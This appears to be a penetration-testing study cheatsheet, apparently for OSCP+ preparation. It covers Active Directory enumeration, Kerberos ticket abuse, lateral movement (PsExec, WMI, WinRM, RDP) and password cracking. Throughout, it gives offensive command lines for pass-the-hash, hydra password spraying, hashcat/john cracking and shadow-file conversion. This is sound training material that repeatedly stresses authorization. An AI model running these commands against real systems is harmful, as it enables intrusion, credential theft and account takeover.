title: 10.1.18.2.4 Find: Use Credential Manager and DPAPI with the protecting context
text: id="variant-10-1-18-2-4">10.1.18.2.4 Find: Use Credential Manager and DPAPI with the protecting context Inspect saved-credential targets and readable protected files within the current protecting user/machine context. whoami /user cmdkey /list Recognize: The target and protecting SID identify which keys/context or consumer must be investigated. Validate next: Check matching master keys/recovery factors or an allowed saved-credential consumer; file read alone is insufficient. Use Credential Manager and DPAPI with the protecting context . <summary

title: 10.1.18.2.5 Find: Parse an offline domain database or select a justified remote collection path
text: id="variant-10-1-18-2-5">10.1.18.2.5 Find: Parse an offline domain database or select a justified remote collection path Start only from evidence of an already controlled DC or a domain replication right; identify the source mechanism before choosing a generic extraction command. file NTDS.dit SYSTEM.save Recognize: A database/key pair is an offline source candidate; remote DRS requires a different permission chain. Validate next: Verify same-source consistency and access, or independently validate the exact replication/remote collection prerequisites. Parse an offline domain database or select a justified remote collection path . <summary

title: 10.1.18.2.6 Find: Request AS-REP material for an account without preauthentication
text: id="variant-10-1-18-2-6">10.1.18.2.6 Find: Request AS-REP material for an account without preauthentication With an authenticated directory view inspect userAccountControl; without a bind, use only the documented known-user/no-password KDC path and distinguish its replies. Get-DomainUser -Properties samaccountname,useraccountcontrol | Select-Object samaccountname,@{n='UAC';e={[int]$_.useraccountcontrol}} | Where-Object { ($_.UAC -band 0x400000) -ne 0 } Recognize: The DONT_REQUIRE_PREAUTH bit is set. Test the bit, not equality to one whole decimal value, because other flags coexist. Validate next: Check account state, KDC route, response/encryption type and feasible recovery; no-password discovery requires a real known username. Request AS-REP material for an account without preauthentication . <summary

title: 10.1.18.2.7 Find: Request a selected service ticket for offline service-account recovery
text: id="variant-10-1-18-2-7">10.1.18.2.7 Find: Request a selected service ticket for offline service-account recovery Use a directory client's user-owned SPN inventory and inspect the associated account's memberships/utility before requesting a selected ticket. Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname,memberof Recognize: A user-owned SPN supplies the account key targeted by a service ticket and a reason to assess password-recovery feasibility. Validate next: Verify valid KDC context, selected account/SPN, returned encryption type, password model and useful resulting rights. Request a selected service ticket for offline service-account recovery . <summary

title: 10.1.18.2.8 Find: Create a temporary SPN through an effective object right
text: id="variant-10-1-18-2-8">10.1.18.2.8 Find: Create a temporary SPN through an effective object right Inspect a useful user's SPN set and resolved effective ACL rather than assuming GenericWrite always permits a desired property change. Get-DomainUser -Identity TARGET_USER -Properties serviceprincipalname Get-DomainObjectAcl -Identity TARGET_USER -ResolveGUIDs Recognize: A specific writable SPN property on a useful user can create a ticket-request opportunity. Validate next: Verify trustee/effective property scope, enabled account, unique temporary SPN, KDC context and exact restoration. Create a temporary SPN through an effective object right . <summary

title: 10.1.18.2.9 Find: Inventory, convert and import tickets in the correct logon context
text: id="variant-10-1-18-2-9">10.1.18.2.9 Find: Inventory, convert and import tickets in the correct logon context Inspect tickets already available in the current logon session or cache before requesting, importing or collecting more material. klist Recognize: A current TGT can request appropriate service tickets if the KDC/name route and account context work. Validate next: Distinguish TGT from TGS, format, logon-session scope, lifetime, SPN and destination authorization. Inventory, convert and import tickets in the correct logon context . <summary

title: 10.1.18.2.10 Find: Forge a service-scoped ticket from the correct service key
text: id="variant-10-1-18-2-10">10.1.18.2.10 Find: Forge a service-scoped ticket from the correct service key Classify a verified service key and correlate its account/SPN with the specific target service and domain SID. setspn -Q SERVICE/TARGET_HOST whoami /user klist Recognize: The key must protect the intended service ticket; an arbitrary user's NT hash is not sufficient. Validate next: Verify key type/current value, domain SID, principal/SPN, validation behavior and accepted target action. Forge a service-scoped ticket from the correct service key . <summary

title: 10.1.18.2.11 Find: Reset a target account password through a validated directory right
text: id="variant-10-1-18-2-11">10.1.18.2.11 Find: Reset a target account password through a validated directory right Follow a mapped useful-user ACL edge and resolve the actual password-reset extended right for the controlled trustee. Get-DomainObjectAcl -Identity TARGET_USER -ResolveGUIDs Recognize: An applicable reset operation changes a target credential; it does not reveal the old password. Validate next: Validate effective membership, protection/account state, account utility and the authorized impact of a disruptive reset. Reset a target account password through a validated directory right . <summary

title: 10.1.18.2.12 Find: Add a controlled identity to a group through effective membership rights
text: id="variant-10-1-18-2-12">10.1.18.2.12 Find: Add a controlled identity to a group through effective membership rights Select the useful group from mapping and inspect its current member list and exact member-attribute ACL. Get-DomainGroupMember -Identity TARGET_GROUP Get-DomainObjectAcl -Identity TARGET_GROUP -ResolveGUIDs Recognize: A membership-write operation can grant a defined group capability once new logon/token state reflects it. Validate next: Verify effective right, actual group-derived authorization, nesting/token refresh and restoration. Add a controlled identity to a group through effective membership rights . <summary

title: 10.1.18.2.13 Find: Convert ownership or DACL control into a narrower useful right
text: id="variant-10-1-18-2-13">10.1.18.2.13 Find: Convert ownership or DACL control into a narrower useful right Inspect resolved ownership/DACL rights on the exact useful object and separate the intermediate right from the final desired operation. Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs Recognize: Ownership/DACL control may enable a narrower useful ACE; it is an intermediate capability. Validate next: Validate actual owner semantics, deny/protected-object behavior, ability to grant the next right and original-state restoration. Convert ownership or DACL control into a narrower useful right . <summary

title: 10.1.18.2.14 Find: Use validated directory replication rights for bounded credential proof
text: id="variant-10-1-18-2-14">10.1.18.2.14 Find: Use validated directory replication rights for bounded credential proof Inspect the domain naming-context ACL and resolve replication-specific extended rights for the controlled identity/group. Get-DomainObjectAcl -Identity DOMAIN_DN -ResolveGUIDs Recognize: Replication rights at the domain scope are the relevant clue; local administrator rights on a member host are different. Validate next: Verify the complete effective replication rights for selected data, trustee membership, DC/RPC route and identity context. Use validated directory replication rights for bounded credential proof . <summary

title: 10.1.18.2.15 Find: Conditional: trace GPO control to privileged policy consumption
text: id="variant-10-1-18-2-15">10.1.18.2.15 Find: Conditional: trace GPO control to privileged policy consumption Enumerate GPO/OU links, then inspect the relevant directory object and SYSVOL policy component's effective control and target applicability. Get-DomainGPO Get-DomainOU | Select-Object name,gplink Recognize: A linked policy supplies a potential privileged consumer only for hosts to which it actually applies. Validate next: Check both needed policy components, effective ACEs, security/WMI filtering, target scope and refresh trigger. Conditional: trace GPO control to privileged policy consumption . <summary

title: 10.1.18.2.16 Find: Conditional: use a validated delegation or RBCD relationship
text: id="variant-10-1-18-2-16">10.1.18.2.16 Find: Conditional: use a validated delegation or RBCD relationship Inspect directory delegation flags/attributes and map the service principals before considering any impersonation request. Get-DomainComputer -TrustedToAuth Get-DomainComputer -Unconstrained Recognize: A delegation flag opens a configuration investigation; unconstrained, constrained and RBCD require different relationships. Validate next: Identify exact delegation type, controlled service/machine key, target SPN, relevant account flags and KDC acceptance. Conditional: use a validated delegation or RBCD relationship . <summary

title: 10.1.18.2.17 Find: Conditional: validate an AD CS enrollment-to-authentication path
text: id="variant-10-1-18-2-17">10.1.18.2.17 Find: Conditional: validate an AD CS enrollment-to-authentication path Enumerate the CA and enabled templates with the known directory identity, then read rights and settings rather than acting on an ESC label. certipy find -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP -enabled Recognize: The conjunction of purpose, subject control and effective enrollment rights is a candidate; issuance and identity mapping are separate gates. Validate next: Check exact template/CA rights/settings, approval/signatures, required key, current mapping and authenticatable identity. Conditional: validate an AD CS enrollment-to-authentication path . <summary

title: 10.1.18.2.18 Find: Conditional: understand a realm-wide TGT forgery from KRBTGT material
text: id="variant-10-1-18-2-18">10.1.18.2.18 Find: Conditional: understand a realm-wide TGT forgery from KRBTGT material Begin only after protected private evidence establishes the actual domain KRBTGT key and SID; inspect account/source metadata rather than assuming any domain hash suffices. klist whoami /user Recognize: KRBTGT key exposure is the enabling post-compromise condition; an ordinary NT hash or unrelated ticket cannot substitute. Validate next: Verify current cryptographic material/version, realm/SID/principal, time and actual service validation; retain recovery/cleanup scope. Conditional: understand a realm-wide TGT forgery from KRBTGT material . <h3

title: 10.1.18.3 Move to another host
text: id="move-to-another-host">10.1.18.3 Move to another host <summary

title: 10.1.18.3.1 Find: Match route, destination service and effective authorization
text: id="variant-10-1-18-3-1">10.1.18.3.1 Find: Match route, destination service and effective authorization Use the discovered destination name/address and known credential record, then inspect the selected service ports from the actual direct or established pivot source. nmap -Pn -sT -p 135,445,3389,5985,5986 TARGET getent hosts TARGET_HOST Recognize: SMB/RPC are transport candidates while WinRM is not yet reachable; dynamic RPC and authorization are still untested. Validate next: Probe the destination from the real source. Check DNS/service names and each required SMB/RPC/WinRM endpoint, then test effective service authorization. An open port and an accepted password do not establish a working remote execution method. Match route, destination service and effective authorization . <summary

title: 10.1.18.3.2 Find: Execute through uploaded service creation using PsExec
text: id="variant-10-1-18-3-2">10.1.18.3.2 Find: Execute through uploaded service creation using PsExec From an accepted SMB identity inspect the required administrative share and the separate ability to create/start services on that host. nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares Recognize: Administrative-share control is one PsExec prerequisite, not proof of every service/pipe operation. Validate next: Validate actual SCM rights, binary compatibility, service start and named-pipe path; check the final execution identity. Execute through uploaded service creation using PsExec . <summary

title: 10.1.18.3.3 Find: Execute commands through service command lines and SMB output
text: id="variant-10-1-18-3-3">10.1.18.3.3 Find: Execute commands through service command lines and SMB output Inspect known administrative SMB/SCM context and the output-share path when a service-command mechanism is preferable to binary upload. nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares Recognize: A share and possible service rights suggest the command-line service route, whose output still has its own access path. Validate next: Confirm service create/start, exact output mode/share and command effect independently from retrieved stdout. Execute commands through service command lines and SMB output . <summary

title: 10.1.18.3.4 Find: Execute through remote Task Scheduler
text: id="variant-10-1-18-3-4">10.1.18.3.4 Find: Execute through remote Task Scheduler Use destination RPC/SMB evidence and effective administrative/task rights to investigate Task Scheduler as a one-shot execution consumer. Test-NetConnection TARGET -Port 135 Test-NetConnection TARGET -Port 445 Recognize: The required network services are candidates; a task cannot be assumed creatable from port results. Validate next: Check negotiated RPC reachability, task-create permission, actual principal and administrative output channel. Execute through remote Task Scheduler . <summary

title: 10.1.18.3.5 Find: Execute through WMI or native CIM over DCOM
text: id="variant-10-1-18-3-5">10.1.18.3.5 Find: Execute through WMI or native CIM over DCOM Investigate WMI from RPC/service inventory and exact account rights; keep process creation and SMB-based output retrieval as separate legs. Test-NetConnection TARGET -Port 135 Test-NetConnection TARGET -Port 445 Recognize: Port 135 and an output route justify further checks but do not prove a WMI process can be created. Validate next: Validate dynamic ports, DCOM/WMI authorization, native CIM transport choice and actual effect. Execute through WMI or native CIM over DCOM . <summary

title: 10.1.18.3.6 Find: Execute through an authorized DCOM application object
text: id="variant-10-1-18-3-6">10.1.18.3.6 Find: Execute through an authorized DCOM application object Use the target's RPC and administration evidence to investigate a specific supported COM application, rather than treating DCOM as a universal shell. Test-NetConnection TARGET -Port 135 Recognize: A named application and route form a candidate; component availability and allowed activation/method remain separate. Validate next: Check dynamic RPC, actual class/rights, authentication/tool support, method and verifiable output/effect. Execute through an authorized DCOM application object . <summary

title: 10.1.18.3.7 Find: Use WinRM, WinRS or PowerShell remoting
text: id="variant-10-1-18-3-7">10.1.18.3.7 Find: Use WinRM, WinRS or PowerShell remoting Check observed WinRM listeners from the real source and relate the identity to the configured endpoint/session authorization. Test-NetConnection TARGET -Port 5985 Test-NetConnection TARGET -Port 5986 Recognize: A reachable endpoint plus a known credential is a candidate, not proof the account may enter that remoting session. Validate next: Verify accepted authentication, correct name/TLS context, endpoint rights and any second-hop requirements. Use WinRM, WinRS or PowerShell remoting . <summary

title: 10.1.18.3.8 Find: Obtain an authorized RDP interactive session
text: id="variant-10-1-18-3-8">10.1.18.3.8 Find: Obtain an authorized RDP interactive session Check the destination RDP endpoint and use actual group/logon-policy evidence for the candidate identity; determine whether password or Restricted Admin is intended. Test-NetConnection TARGET -Port 3389 Recognize: RDP transport does not grant desktop access; Restricted Admin/hash use has additional requirements. Validate next: Check NLA/TLS, identity qualification, logon authorization and the chosen authentication mode. Obtain an authorized RDP interactive session . <summary

title: 10.1.18.3.9 Find: Select password, NT hash, key-to-ticket or ticket authentication
text: id="variant-10-1-18-3-9">10.1.18.3.9 Find: Select password, NT hash, key-to-ticket or ticket authentication Return to the credential source and inspect format, identity and ticket service scope before selecting a remote protocol. klist getent hosts TARGET_HOST date -u Recognize: The cache permits investigating a matching CIFS action, not arbitrary WinRM or a new TGS without a TGT/KDC route. Validate next: Match NTLM versus Kerberos support, account/domain, key/encryption policy, name/time and destination rights. Select password, NT hash, key-to-ticket or ticket authentication .

title: 10.2 AD Investigation — Where to Look and What Output Means
text: id="ad-investigation--where-to-look-and-what-output-means">10.2 AD Investigation — Where to Look and What Output Means Cheatsheet index | Focused AD Notes | Complete AD procedures Use one check to answer one question. The expected result below is a cue, not proof of a complete attack. Replace placeholders in the selected access context; commands remain study references during concept study. <h2

title: 10.2.1 What identity and domain am I actually using?
text: id="what-identity-and-domain-am-i-actually-using">10.2.1 What identity and domain am I actually using? Requires: A Windows session, or domain credentials on Kali. A Windows username alone does not establish the identity used for network authentication . Run: Windows. Access: Current token ; domain/DC queries additionally need a usable domain/network context. Effect: Reads identity, discovery and time state. whoami /all echo %USERDNSDOMAIN% echo %USERDOMAIN% echo %LOGONSERVER% nltest /dsgetdc:DOMAIN nltest /dclist:DOMAIN w32tm /query /status Interpret: whoami describes the process token. Domain environment variables are clues, not proof of successful authentication. nltest discovers a DC; SRV lookups test the naming layer. A plausible time source is useful, but does not itself prove the clock agrees with the KDC . Failure / next: Discovery or time checks fail: repair that dependency before judging an account or technique. Stop when: The local/network identity, domain/DC and relevant naming/time/route dependencies are recorded.. Revisit only when: Identity, DC, resolver, clock or source route changes.. Annotated output and next decisions | Full procedure <h2

title: 10.2.2 Where do I find useful users and group memberships?
text: id="where-do-i-find-useful-users-and-group-memberships">10.2.2 Where do I find useful users and group memberships? Requires: A working domain query context. Native Windows commands use the current network context; off-domain clients need explicit supported authentication. Run: Windows. Access: Current domain query context; /domain selects directory rather than local accounts. Effect: Reads user, group and policy information. net user /domain net user USER /domain net group /domain net group "Domain Admins" /domain net group "GROUP" /domain net accounts /domain nltest /domain_trusts /all_trusts net view /domain net view \\DC_HOST Interpret: The /domain switch selects domain objects rather than the local SAM. User detail connects an account to memberships; group detail identifies principals to investigate. RSAT adds structured queries only when its module exists. Failure / next: Membership is partial or a query is denied: retain the gap; do not record the group as empty. Stop when: Selected accounts, memberships and the next useful right are identified; unexplained names remain leads.. Revisit only when: A new identity or changed membership reveals different effective access.. Annotated output and next decisions | Full procedure <h2

title: 10.2.3 Which shares and files should I inspect first?
text: id="which-shares-and-files-should-i-inspect-first">10.2.3 Which shares and files should I inspect first? Requires: A reachable SMB endpoint and an identified anonymous, local or domain authentication context. These contexts must be recorded separately. Run: Windows. Access: Selected SMB server; current network identity and share/object permissions. Effect: Lists shares/directories; does not test file write or execution. net view \\DC_HOST dir \\DC_HOST\SYSVOL dir \\DC_HOST\NETLOGON Interpret: net view and --shares inventory share-level candidates. smbclient then tests the named share with an explicit identity; ls, cd and get test progressively narrower objects. A successful file read can disclose information without granting execution. Failure / next: Listing works but file reading is untested: keep the content claim inconclusive . Stop when: The selected share/file access boundary and any useful clue are recorded.. Revisit only when: A new credential, permission or referenced file changes the access context.. Annotated output and next decisions | Full procedure <h2

title: 10.2.4 What does an SPN tell me to investigate?
text: id="what-does-an-spn-tell-me-to-investigate">10.2.4 What does an SPN tell me to investigate? Requires: A domain directory query context, with user/group enumeration available. Run: Windows with setspn available. Access: Tool execution prerequisites and permitted domain directory queries; do not assume the binary is installed. Effect: Lists registrations; the shown -Q/-L forms do not add SPNs . setspn -Q */* setspn -L ACCOUNT Interpret: setspn inventories registrations; PowerView joins SPNs to account attributes. This is account/service mapping. Requesting offline guessing material and deciding whether cracking is worthwhile belong to the next page. Failure / next: The service is unreachable: account enumeration still stands; remote service access remains unproved. Stop when: The service registration is tied to its owning account and a concrete account-value question.. Revisit only when: A new account right, service route or justified password strategy changes the value.. Annotated output and next decisions | Full procedure <h2

title: 10.2.5 An ACL shows a powerful right — can I actually use it?
text: id="an-acl-shows-a-powerful-right--can-i-actually-use-it">10.2.5 An ACL shows a powerful right — can I actually use it? Requires: A selected directory object and a controlled identity whose direct/nested memberships are known. Run: Windows PowerShell with reviewed PowerView. Access: Read access to the selected object security descriptor; controlled trustee membership must be checked separately. Effect: Reads candidate ACEs ; does not change permissions. Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|ExtendedRight|WriteProperty|Self' } | Select-Object ObjectDN,SecurityIdentifier,ActiveDirectoryRights,ObjectAceType,AceType,IsInherited,InheritanceType Interpret: The filter selects interesting candidate ACEs, not a complete effective-access calculation. Resolve all applicable rules and the specific attribute/extended right before choosing a transition. Failure / next: SID /GUID/inheritance is unresolved: do not perform a speculative modification. Stop when: Trustee, applicable right, target type and missing effective-access checks are explicit.. Revisit only when: Membership, object ACL, scope or the controlled identity changes.. Annotated output and next decisions | Full procedure <h2

title: 10.2.6 How do I turn a BloodHound graph into a verified path?
text: id="how-do-i-turn-a-bloodhound-graph-into-a-verified-path">10.2.6 How do I turn a BloodHound graph into a verified path? Requires: A supported collector, compatible BloodHound deployment and a known collection identity. Mark only the identities and capabilities actually controlled. Run: Windows with compatible SharpHound CE. Access: Domain DNS, authenticated directory context and compatible BloodHound ingestion. Effect: Collects directory relationships; DCOnly does not collect live workstation sessions. .\SharpHound.exe --CollectionMethods DCOnly --OutputDirectory .\bh --ZipFileName domain-dconly.zip Interpret: The first command collects directory data. The next commands add selected-host group/session evidence. Choose the source matching the deployment; legacy and current collectors are not interchangeable. Failure / next: Host/session data was not collected: collect narrowly or validate manually. Stop when: One candidate path has each required edge classified and its next manual check chosen.. Revisit only when: Collection scope, identity, host rights or session freshness changes.. Annotated output and next decisions | Full procedure <h2

title: 10.2.7 Choose a method and read its evidence
text: id="choose-a-method-and-read-its-evidence">10.2.7 Choose a method and read its evidence Method comparison | Terminology | Continuous worked investigation | Unanswered interpretation cases Compare raw lines with the annotated examples before accepting a normalized observation. A denial, empty query or incomplete collection can justify repairing a dependency or recording uncertainty rather than attempting an attack. <h2

title: 10.2.8 Useful location does not equal a vulnerability
text: id="useful-location-does-not-equal-a-vulnerability">10.2.8 Useful location does not equal a vulnerability SYSVOL/NETLOGON -> scripts, policy and referenced files; application/deployment shares -> selected configurations; user/group objects -> effective memberships; target ACL -> exact trustee/right/GUID; SPNs -> service-account value; host/session evidence -> current reachable service rights and freshness. Secure-boundary comparison | Credential classification | Failure diagnosis

title: 10.3 Credentials and Cracking Cheatsheet
text: id="credentials-and-cracking-cheatsheet">10.3 Credentials and Cracking Cheatsheet ← Cheatsheet index | Full procedure | Strategy map | Study methods: Recover and use authentication material source -> format -> identity/context -> compatible use -> authentication -> authorization -> new access -> re-enumerate <h2

title: 10.3.1 Classify
text: id="classify">10.3.1 Classify hashid HASH_OR_FILE john --list=formats | grep -i KEYWORD hashcat --example-hashes | less Material Do not confuse it with Next action NT hash Net-NTLMv2 response Crack mode 1000 or compatible NTLM PtH Net-NTLMv2 Reusable NT hash Crack mode 5600 or authorized relay conditions DCC2/MSCache v2 NT hash Offline recovery with username; not ordinary PtH .kirbi /ccache Password/hash Validate ticket, SPN , time and service SSH key Password Fix permissions; crack only its passphrase if protected KeePass/ZIP/PDF/Office Raw password Convert with matching *2john tool <h2

title: 10.3.2 Validate one known credential
text: id="validate-one-known-credential">10.3.2 Validate one known credential ssh -o PreferredAuthentications=password -p PORT USER@TARGET nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares nxc smb TARGET --local-auth -u USER -p 'PASSWORD' --shares evil-winrm -i TARGET -u USER -p 'PASSWORD' xfreerdp /v:TARGET /u:'DOMAIN\USER' /p:'PASSWORD' /cert:ignore Login accepted proves authentication to that service. Shares, sessions, execution and administrator rights are separate authorization claims. <h2

title: 10.3.3 Authorized online dictionary/spray
text: id="authorized-online-dictionaryspray">10.3.3 Authorized online dictionary/spray <h3

title: 10.3.3.1 one known user, candidate passwords
text: id="variant-10-3-3-1">10.3.3.1 one known user, candidate passwords # one known user, candidate passwords hydra -l USER -P WORDLIST -s PORT -t 4 -f ssh://TARGET <h3

title: 10.3.3.2 one password, candidate users
text: id="variant-10-3-3-2">10.3.3.2 one password, candidate users # one password, candidate users hydra -L USERS -p 'PASSWORD' -s PORT -t 1 rdp://TARGET HTTP form after capturing the real request and failure marker: hydra -l USER -P WORDLIST TARGET http-post-form \ '/LOGIN_PATH:username=^USER^&password=^PASS^:F=STABLE_FAILURE_TEXT' Check lockout/rate controls first and manually confirm tool hits. Dynamic CSRF/cookies and weak condition strings require manual handling. <h2

title: 10.3.4 Hashcat
text: id="hashcat">10.3.4 Hashcat hashcat -b -m MODE hashcat -a 0 -m MODE hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule --session job hashcat -m MODE hashes.txt --show hashcat -r /usr/share/hashcat/rules/best64.rule --stdout wordlist.txt | head <h3

title: 10.3.4.1 known pattern
text: id="variant-10-3-4-1">10.3.4.1 known pattern # known pattern hashcat -a 3 -m MODE hashes.txt '?u?l?l?l?l?d?d?d' --session mask-job <h3

title: 10.3.4.2 word plus three digits
text: id="variant-10-3-4-2">10.3.4.2 word plus three digits # word plus three digits hashcat -a 6 -m MODE hashes.txt wordlist.txt '?d?d?d' --session hybrid-job <h3

title: 10.3.4.3 resume
text: id="variant-10-3-4-3">10.3.4.3 resume # resume hashcat --session job --restore -a 0 is dictionary mode; -a 3 expects a mask, not a wordlist. Measure the actual mode before attempting a large keyspace. # confirm modes locally hashcat -h | grep -Ei 'NTLM|NetNTLMv2|KeePass|OpenSSH|Kerberos' Common current mappings: NTLM 1000 , Net-NTLMv2 5600 , KeePass 13400 , AS-REP etype 23 18200 , TGS etype 23 13100 . Installed help/example hashes win. <h2

title: 10.3.5 John
text: id="john">10.3.5 John john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt john --show hash.txt john --format=FORMAT --wordlist=wordlist.txt --rules=Jumbo hash.txt john --session=job --wordlist=wordlist.txt hash.txt john --restore=job <h2

title: 10.3.6 Convert protected files
text: id="convert-protected-files">10.3.6 Convert protected files zip2john archive.zip > archive.hash ssh2john id_rsa > ssh.hash keepass2john vault.kdbx > keepass.hash pdf2john document.pdf > pdf.hash office2john document.docx > office.hash rar2john archive.rar > rar.hash 7z2john archive.7z > 7z.hash unshadow passwd.copy shadow.copy > linux.hash <h2

title: 10.3.7 SSH key
text: id="ssh-key">10.3.7 SSH key chmod 600 id_rsa ssh-keygen -y -f id_rsa > derived.pub ssh -vv -i id_rsa -o IdentitiesOnly=yes -p PORT USER@TARGET # protected key recovery ssh2john id_rsa > ssh.hash john --wordlist=wordlist.txt --rules=Jumbo ssh.hash john --show ssh.hash Key unlock and server authorization are separate. Permission denied (publickey) can occur after the passphrase was correct. <h2

title: 10.3.8 Linux password records
text: id="linux-password-records">10.3.8 Linux password records unshadow passwd.copy shadow.copy > linux.hash john --wordlist=wordlist.txt --rules=Jumbo linux.hash john --show linux.hash <h2

title: 10.3.9 Pass-the-hash
text: id="pass-the-hash">10.3.9 Pass-the-hash nxc smb TARGET -d DOMAIN -u USER -H NT_HASH --shares impacket-wmiexec -hashes :NT_HASH 'DOMAIN/USER@TARGET' xfreerdp /v:TARGET /u:'DOMAIN\USER' /pth:NT_HASH /cert:ignore Authentication ≠ remote authorization. Re-enumerate every service/share/right after a successful identity transition. Responder spoofing is prohibited on the OSCP+ exam; keep capture/relay work to explicitly authorized labs. <h2

title: 10.3.10 Net-NTLMv2 and DCC2
text: id="net-ntlmv2-and-dcc2">10.3.10 Net-NTLMv2 and DCC2 hashcat -a 0 -m 5600 netntlmv2.hash wordlist.txt john --format=netntlmv2 --wordlist=wordlist.txt netntlmv2.hash john --format=mscash2 --wordlist=wordlist.txt dcc2.hash Neither is a reusable NT hash. Net-NTLMv2 relay is a separate live exchange; DCC2 preserves username-dependent context. <h2

title: 10.3.11 Kerberos ticket/cache
text: id="kerberos-ticketcache">10.3.11 Kerberos ticket/cache klist KRB5CCNAME=TICKET.ccache klist impacket-ticketConverter TICKET.kirbi TICKET.ccache export KRB5CCNAME=TICKET.ccache impacket-wmiexec -k -no-pass 'DOMAIN/USER@HOST.DOMAIN' Check principal, realm, TGT /TGS type, SPN, validity, clock, DNS/FQDN, route and service rights. <h2

title: 10.3.12 Failure router
text: id="failure-router">10.3.12 Failure router Symptom Next action Timeout/refused Fix route/service before judging material Local/domain login fails Recheck identity context and supported auth method Parser/ token error Recheck complete format, converter, mode and tool version Auth succeeds, access denied Preserve valid identity; enumerate authorization SSH key unlocks, server rejects Recheck user/server/authorized key/policy Ticket loads, service rejects Check expiry, SPN, realm, clock and DNS PtH authenticates, execution fails Check admin rights, UAC restrictions and method prerequisites <h2

title: 10.3.13 Re-enumerate
text: id="re-enumerate">10.3.13 Re-enumerate identity -> groups/roles -> services -> shares/files -> application features -> accessible hosts/routes -> new credentials/tickets/sessions -> next block <h2

title: 10.3.14 Use a known password from a Windows foothold
text: id="use-a-known-password-from-a-windows-foothold">10.3.14 Use a known password from a Windows foothold Run a reviewed RunasCs build on the current Windows host with the intended account scope. It accepts a plaintext password, not an NT hash. REM Domain account: inspect the resulting token RunasCs.exe USER PASSWORD "cmd /c whoami /all" -d DOMAIN REM Local account on this host RunasCs.exe USER PASSWORD "cmd /c whoami /all" REM Network-only: local identity stays unchanged; inspect the remote result RunasCs.exe USER PASSWORD "cmd /c dir \\TARGET\SHARE" -d DOMAIN -l 9 With logon type 9, whoami does not validate the outbound password. An authentication success is separate from resource authorization or an elevated token. Full credential-use procedure . <h2

title: 10.3.15 Discover and recognize candidates
text: id="discover-and-recognize-candidates">10.3.15 Discover and recognize candidates Use these discovery checks to find a candidate, then validate the missing conditions. Cues are illustrative; complete synthetic outputs and three-outcome examples are in the linked study entries. <h3

title: 10.3.15.1 Recover and use authentication material
text: id="recover-and-use-authentication-material">10.3.15.1 Recover and use authentication material <summary

title: 10.3.15.1.1 Find: Classify the artifact and its identity context
text: id="variant-10-3-15-1-1">10.3.15.1.1 Find: Classify the artifact and its identity context Return to the file, database row, capture or session that produced the artifact; inspect structure and account labels before choosing a tool mode. file FILE head -c 160 FILE Recognize: Headers and producing context distinguish a private key, challenge response and stored NT verifier. Validate next: Record the exact source, user/domain and complete format; identify compatible recovery/authentication operations. Classify the artifact and its identity context . <summary

title: 10.3.15.1.2 Find: Validate known passwords and context-specific reuse
text: id="variant-10-3-15-1-2">10.3.15.1.2 Find: Validate known passwords and context-specific reuse Use the account label from the producing source and the observed service inventory to choose one compatible, correctly qualified validation. nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' Recognize: Accepted authentication proves one service/account pairing; it does not establish shares, administration, RDP or WinRM. Validate next: Qualify local/domain/application identity explicitly, test a compatible reachable service and record the accepted identity. Then test the specific share/logon/execution right; successful authentication is not administrative authorization. Validate known passwords and context-specific reuse . <summary

title: 10.3.15.1.3 Find: Recover passwords with feasible dictionary, rule and mask attacks
text: id="variant-10-3-15-1-3">10.3.15.1.3 Find: Recover passwords with feasible dictionary, rule and mask attacks Identify a supported verifier/converter and build candidate structure from relevant names/policy/context rather than selecting an arbitrary hash mode. hashcat --example-hashes john --list=formats Recognize: A verified format and feasible candidate model enable offline recovery; a hash-shaped string alone does not. Validate next: Check complete salt/context, conversion correctness, tool backend and whether all required factors are present. Recover passwords with feasible dictionary, rule and mask attacks . <summary

title: 10.3.15.1.4 Find: Recover a protected KeePass database password
text: id="variant-10-3-15-1-4">10.3.15.1.4 Find: Recover a protected KeePass database password Look for a vault in readable backups/shares/application data, then inspect file identity and nearby factor/configuration references. file FILE keepass2john FILE > keepass.hash Recognize: A supported database gives a recovery target, but a referenced key file indicates a separate factor. Validate next: Confirm vault version, required key/account factors and a feasible password search. Recover a protected KeePass database password . <summary

title: 10.3.15.1.5 Find: Inspect and recover SSH private-key access
text: id="variant-10-3-15-1-5">10.3.15.1.5 Find: Inspect and recover SSH private-key access Trace readable key files from home/configuration/backups to a specific username; inspect the key parser's response before testing the server. file KEY ssh-keygen -y -f KEY Recognize: The artifact is a private key protected by a local passphrase; this is separate from the SSH account password. Validate next: Determine the protecting passphrase, associated remote user, accepted algorithm and server key authorization. Inspect and recover SSH private-key access . <summary

title: 10.3.15.1.6 Find: Recover Linux account passwords from matched records
text: id="variant-10-3-15-1-6">10.3.15.1.6 Find: Recover Linux account passwords from matched records Inspect permission-backed account backups or privileged read results; associate shadow verifiers with the matching passwd metadata. file passwd.txt shadow.txt head -n 3 passwd.txt head -n 3 shadow.txt Recognize: The matching account name and verifier prefix identify an offline password-recovery candidate. Validate next: Confirm snapshots, hash format and account state; a locked field or absent salt is not a normal usable verifier. Recover Linux account passwords from matched records . <summary

title: 10.3.15.1.7 Find: Recover or reuse an NT password hash
text: id="variant-10-3-15-1-7">10.3.15.1.7 Find: Recover or reuse an NT password hash Inspect the output schema of a justified local/domain credential source, keeping RID, machine and domain labels. head -n 3 hashes.txt Recognize: The source and record fields identify an NT verifier for that local account, not a captured challenge response. Validate next: Verify the actual NT field, account scope and an accepting service/client with the required destination right. Recover or reuse an NT password hash . <summary

title: 10.3.15.1.8 Find: Recover a password from a captured NTLM response
text: id="variant-10-3-15-1-8">10.3.15.1.8 Find: Recover a password from a captured NTLM response Use the saved authorized capture's structure and source context; inspect username/domain/challenge/response fields before selecting recovery. head -n 2 responses.txt Recognize: A challenge-bound response supports its appropriate offline verification workflow; it is not the long-term NT hash. Validate next: Check complete capture format, account mapping and feasible candidates; acquisition/relay policy is a separate issue. Recover a password from a captured NTLM response . <summary

title: 10.3.15.1.9 Find: Recover a password from cached domain logon verifiers
